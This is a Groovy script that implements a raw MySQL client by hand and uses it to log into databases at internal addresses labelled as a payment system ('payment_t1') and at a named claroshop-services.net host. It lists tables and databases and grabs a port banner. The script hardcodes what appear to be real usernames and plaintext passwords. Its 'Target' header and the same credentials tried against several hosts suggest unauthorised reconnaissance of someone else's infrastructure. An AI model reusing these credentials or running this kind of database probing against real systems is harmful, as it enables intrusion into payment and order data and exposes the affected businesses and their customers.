// MySQL puro en Groovy v3 - limpio con ByteArrayOutputStream
// Target: 172.27.141.26:3306 app_t1 / pySY8}7>ftpPz9S / payment_t1
import java.security.MessageDigest
import javax.crypto.Mac
import javax.crypto.spec.SecretKeySpec

def concat = { byte[]... arrays ->
    def baos = new java.io.ByteArrayOutputStream()
    arrays.each { baos.write(it) }
    baos.toByteArray()
}

def le4 = { int n ->
    [(n & 0xFF) as byte, ((n >> 8) & 0xFF) as byte, ((n >> 16) & 0xFF) as byte, ((n >> 24) & 0xFF) as byte] as byte[]
}

def le3 = { int n ->
    [(n & 0xFF) as byte, ((n >> 8) & 0xFF) as byte, ((n >> 16) & 0xFF) as byte] as byte[]
}

def le2 = { int n ->
    [(n & 0xFF) as byte, ((n >> 8) & 0xFF) as byte] as byte[]
}

def readPacket = { java.io.InputStream ins ->
    def hdr = new byte[4]
    int r = 0
    while (r < 4) r += ins.read(hdr, r, 4-r)
    int len = (hdr[0] & 0xFF) | ((hdr[1] & 0xFF) << 8) | ((hdr[2] & 0xFF) << 16)
    def body = new byte[len]
    r = 0
    while (r < len) r += ins.read(body, r, len-r)
    return [seq: hdr[3] & 0xFF, body: body]
}

def writePacket = { java.io.OutputStream out, int seq, byte[] data ->
    int len = data.length
    out.write(len & 0xFF)
    out.write((len >> 8) & 0xFF)
    out.write((len >> 16) & 0xFF)
    out.write(seq & 0xFF)
    out.write(data)
    out.flush()
}

def nativePasswordHash = { String pwd, byte[] scramble ->
    def md5 = MessageDigest.getInstance("SHA-1")
    def hash1 = md5.digest(pwd.getBytes("UTF-8"))
    md5.reset()
    def hash2 = md5.digest(hash1)
    md5.reset()
    md5.update(scramble)
    md5.update(hash2)
    def finalHash = md5.digest()
    for (int i = 0; i < hash1.length; i++) {
        finalHash[i] = (byte)(finalHash[i] ^ hash1[i])
    }
    return finalHash
}

def mysqlQuery = { String host, int port, String user, String pass, String db, String sql ->
    def sock = new java.net.Socket()
    sock.connect(new java.net.InetSocketAddress(host, port), 5000)
    sock.setSoTimeout(10000)
    def ins = sock.inputStream
    def out = sock.outputStream
    
    // Read server greeting
    def greeting = readPacket(ins)
    def body = greeting.body
    
    // Parse greeting
    int protocol = body[0] & 0xFF
    int i = 1
    while (i < body.length && body[i] != 0) i++
    def serverVersion = new String(body, 1, i-1, "UTF-8")
    i++ // skip null
    // thread id (4 bytes)
    i += 4
    // auth-plugin-data-part-1 (8 bytes)
    def scramble1 = new byte[8]
    System.arraycopy(body, i, scramble1, 0, 8)
    i += 8
    i++ // filler
    // capability flags lower 2 bytes
    int capLow = (body[i] & 0xFF) | ((body[i+1] & 0xFF) << 8)
    i += 2
    // charset
    i += 1
    // status
    i += 2
    // capability flags upper 2 bytes
    int capHigh = (body[i] & 0xFF) | ((body[i+1] & 0xFF) << 8)
    i += 2
    int capFlags = capLow | (capHigh << 16)
    // length of auth-plugin-data
    int authDataLen = body[i] & 0xFF
    i++
    // reserved 10 bytes
    i += 10
    // auth-plugin-data-part-2
    int part2Len = Math.max(13, authDataLen - 8)
    def scramble2 = new byte[part2Len]
    System.arraycopy(body, i, scramble2, 0, Math.min(part2Len, body.length - i))
    
    // Full scramble
    def scramble = concat(scramble1, scramble2, [0] as byte[])
    def scramble20 = new byte[20]
    System.arraycopy(scramble, 0, scramble20, 0, 20)
    
    def pwdHash = pass ? nativePasswordHash(pass, scramble20) : new byte[0]
    
    // Build HandshakeResponse41
    int clientFlags = 0x000FA685 // CLIENT_LONG_PASSWORD|FOUND_ROWS|LONG_FLAG|CONNECT_WITH_DB|NO_SCHEMA|COMPRESS_NO|ODBC_NO|LOCAL_FILES|IGNORE_SPACE|PROTOCOL_41|INTERACTIVE|IGNORE_SIGPIPE|TRANSACTIONS|RESERVED|SECURE_CONNECTION|MULTI_STATEMENTS|MULTI_RESULTS
    clientFlags = clientFlags & ~(1 << 5) // no compress
    
    def userBytes = (user + "\u0000").getBytes("UTF-8")
    def dbBytes = (db + "\u0000").getBytes("UTF-8")
    def pluginName = "mysql_native_password\u0000".getBytes("UTF-8")
    
    def authResp = concat([pwdHash.length as byte] as byte[], pwdHash)
    
    def handshake = concat(
        le4(clientFlags),
        le4(16777216),  // max packet
        [0x21] as byte[], // charset utf8
        new byte[23],  // filler
        userBytes,
        authResp,
        dbBytes,
        pluginName
    )
    
    writePacket(out, 1, handshake)
    
    // Read auth response
    def authResp2 = readPacket(ins)
    def resp = authResp2.body
    
    if (resp[0] == (byte)0xFF) {
        int errCode = (resp[1] & 0xFF) | ((resp[2] & 0xFF) << 8)
        def errMsg = new String(resp, 9, resp.length - 9, "UTF-8")
        sock.close()
        return "AUTH_ERROR: " + errCode + " - " + errMsg
    }
    
    if (resp[0] == (byte)0xFE) {
        // Auth plugin switch
        def pluginStart = 1
        while (pluginStart < resp.length && resp[pluginStart] != 0) pluginStart++
        def reqPlugin = new String(resp, 1, pluginStart - 1, "UTF-8")
        def newScramble = new byte[20]
        if (resp.length > pluginStart + 1) {
            System.arraycopy(resp, pluginStart + 1, newScramble, 0, Math.min(20, resp.length - pluginStart - 1))
        }
        def switchHash = pass ? nativePasswordHash(pass, newScramble) : new byte[0]
        writePacket(out, authResp2.seq + 1, switchHash)
        def switchResp = readPacket(ins)
        resp = switchResp.body
        if (resp[0] == (byte)0xFF) {
            int errCode = (resp[1] & 0xFF) | ((resp[2] & 0xFF) << 8)
            def errMsg = new String(resp, 9, resp.length - 9, "UTF-8")
            sock.close()
            return "SWITCH_AUTH_ERROR: " + errCode + " - " + errMsg
        }
    }
    
    if (resp[0] != 0x00) {
        sock.close()
        return "UNEXPECTED_AUTH: 0x" + String.format("%02X", resp[0])
    }
    
    // Send query
    def sqlBytes = sql.getBytes("UTF-8")
    def queryPkt = concat([0x03] as byte[], sqlBytes)
    writePacket(out, 0, queryPkt)
    
    // Read result
    def resultPkt = readPacket(ins)
    def resultBody = resultPkt.body
    
    if (resultBody[0] == (byte)0xFF) {
        int errCode = (resultBody[1] & 0xFF) | ((resultBody[2] & 0xFF) << 8)
        def errMsg = new String(resultBody, 9, resultBody.length - 9, "UTF-8")
        sock.close()
        return "QUERY_ERROR: " + errCode + " - " + errMsg
    }
    
    if (resultBody[0] == 0x00) {
        // OK packet (for non-SELECT)
        sock.close()
        return "OK"
    }
    
    // Result set - num columns
    int numCols = resultBody[0] & 0xFF
    
    // Read column definitions
    def colNames = []
    for (int c = 0; c < numCols; c++) {
        def colPkt = readPacket(ins)
        def cb = colPkt.body
        // Parse length-encoded strings to get column name
        int ci = 0
        def skipLenStr = {
            if (ci < cb.length) {
                int len = cb[ci] & 0xFF
                ci += 1 + len
            }
        }
        skipLenStr() // catalog
        skipLenStr() // schema
        skipLenStr() // table
        skipLenStr() // org_table
        if (ci < cb.length) {
            int nameLen = cb[ci] & 0xFF
            ci++
            colNames << new String(cb, ci, nameLen, "UTF-8")
            ci += nameLen
        }
    }
    
    // Read EOF
    def eofPkt = readPacket(ins)
    
    // Read rows
    def rows = []
    while (true) {
        def rowPkt = readPacket(ins)
        def rb = rowPkt.body
        if ((rb[0] & 0xFF) == 0xFE && rb.length < 9) break // EOF
        if (rb[0] == (byte)0xFF) break // Error
        def row = []
        int ri = 0
        numCols.times {
            if (ri < rb.length) {
                if ((rb[ri] & 0xFF) == 0xFB) {
                    row << "NULL"
                    ri++
                } else {
                    int rlen = rb[ri] & 0xFF
                    ri++
                    if (rlen > 0) {
                        row << new String(rb, ri, rlen, "UTF-8")
                        ri += rlen
                    } else {
                        row << ""
                    }
                }
            }
        }
        rows << row
    }
    
    sock.close()
    def result = "SERVER: " + serverVersion + "\nCOLUMNS: " + colNames.join(", ") + "\n"
    rows.each { row -> result += "ROW: " + row.join(" | ") + "\n" }
    result += "TOTAL: " + rows.size() + " rows"
    return result
}

println "=== MYSQL DIRECT CONNECT ==="

println "\n--- T1Pagos 172.27.141.26:3306 (app_t1) ---"
try {
    println mysqlQuery("172.27.141.26", 3306, "app_t1", "pySY8}7>ftpPz9S", "payment_t1", "SHOW TABLES")
} catch (Exception e) {
    println "ERROR: " + e.message
}

println "\n--- T1Pagos 172.27.141.26:3306 SHOW DATABASES ---"
try {
    println mysqlQuery("172.27.141.26", 3306, "app_t1", "pySY8}7>ftpPz9S", "payment_t1", "SHOW DATABASES")
} catch (Exception e) {
    println "ERROR: " + e.message
}

println "\n--- T1Pagos 172.27.141.4:3306 (app_t1) ---"
try {
    println mysqlQuery("172.27.141.4", 3306, "app_t1", "pySY8}7>ftpPz9S", "payment_t1", "SHOW TABLES")
} catch (Exception e) {
    println "ERROR: " + e.message
}

println "\n--- T1Pagos 172.27.141.4:3306 SHOW DATABASES ---"
try {
    println mysqlQuery("172.27.141.4", 3306, "app_t1", "pySY8}7>ftpPz9S", "payment_t1", "SHOW DATABASES")
} catch (Exception e) {
    println "ERROR: " + e.message
}

// Probe dbpsears.claroshop-services.net:3312
println "\n--- Probe dbpsears.claroshop-services.net:3312 ---"
try {
    def sock = new java.net.Socket()
    sock.connect(new java.net.InetSocketAddress("dbpsears.claroshop-services.net", 3312), 5000)
    def buf = new byte[80]
    def n = sock.inputStream.read(buf, 0, 80)
    sock.close()
    println "OPEN - banner: " + new String(buf, 0, n, "ISO-8859-1").take(40).replaceAll("[^\\x20-\\x7E]", ".")
} catch (Exception e) {
    println "CLOSED: " + e.message
}

println "\n--- dbpsears 3312 apsearsats ---"
try {
    println mysqlQuery("dbpsears.claroshop-services.net", 3312, "apsearsats", "7g4kktCAEuOV9CX", "tienda", "SHOW TABLES LIKE 'pedidos'")
} catch (Exception e) {
    println "ERROR: " + e.message
}

println "=== FIN ==="
